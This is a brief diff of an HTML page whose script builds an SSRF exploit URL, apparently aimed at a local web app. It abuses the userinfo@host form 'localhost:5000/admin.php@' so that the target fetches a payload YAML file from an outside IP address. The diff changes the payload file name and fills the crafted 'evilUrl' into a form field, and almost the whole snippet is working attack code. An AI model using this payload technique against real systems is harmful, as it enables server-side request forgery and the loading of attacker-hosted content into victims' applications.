@@ -9,7 +9,7 @@
     // IMPORTANT: this string must START with the exact URL_PREFIX, then use userinfo@host SSRF.
     // Example final URL:
     //   http://localhost:5000/admin.php@YOUR_HOST_AND_PATH
-    const payloadHostPath = "75.119.143.38:8001/y.yaml"; // e.g. raw.githubusercontent.com/user/repo/branch/payload.yaml
+    const payloadHostPath = "75.119.143.38:8001/x.yaml"; // e.g. raw.githubusercontent.com/user/repo/branch/payload.yaml
     const evilUrl = "http://localhost:5000/admin.php@" + payloadHostPath;
 
     document.getElementById("u").value = evilUrl;
@@ -17,3 +17,4 @@
   </script>
 </body>
 </html>
+
